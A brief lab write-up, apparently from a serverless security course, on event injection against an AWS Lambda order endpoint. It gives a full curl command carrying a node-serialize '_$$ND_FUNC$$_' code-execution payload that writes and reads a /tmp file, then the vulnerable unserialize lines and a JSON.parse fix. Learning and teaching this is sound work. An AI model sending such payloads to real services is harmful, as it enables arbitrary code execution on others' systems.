# Lesson 1 - Event Injection

## Attack Command
curl -X POST "https://fevzm5rpw5.execute-api.us-east-1.amazonaws.com/Stage/order" ^
-H "Content-Type: application/json" ^
-d "{\"action\":\"_$$ND_FUNC$$_function(){ var fs = require('fs'); fs.writeFileSync('/tmp/pwned.txt','You are reading the contents of my hacked file!'); var fileData = fs.readFileSync('/tmp/pwned.txt','utf-8'); console.error('FILE READ SUCCESS: ' + fileData); }()\",\"cart-id\":\"\"}"

## Result
Internal server error

## Proof
CloudWatch shows FILE READ SUCCESS

## Problematic code: 
var req = serialize.unserialize(event.body); 
var headers = serialize.unserialize(event.headers);

unserialize treats special text like code and run it.

## Fixed code:
var req = JSON.parse(event.body);
var headers = event.headers;

This reads the request body as plain JSON data only.
It does not run functions.
